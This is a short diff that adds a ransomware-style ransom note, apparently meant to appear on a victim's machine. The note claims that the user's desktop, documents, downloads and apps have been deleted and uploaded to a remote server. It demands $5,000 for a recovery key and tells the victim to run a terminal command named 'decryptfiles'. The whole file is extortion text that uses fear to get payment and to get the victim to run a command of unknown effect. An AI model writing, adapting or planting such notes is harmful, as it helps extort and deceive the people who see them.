@@ -1,0 +1,6 @@
+Oh no!
+All of the files in your desktop, documents, downloads, and most of your apps have been deleted!
+They have been uploaded to a remote server, and you cannot get them back yourself.
+
+You may purchase a key for $5,000 to get them back, though. 
+To purchase one, please run the terminal command: decryptfiles
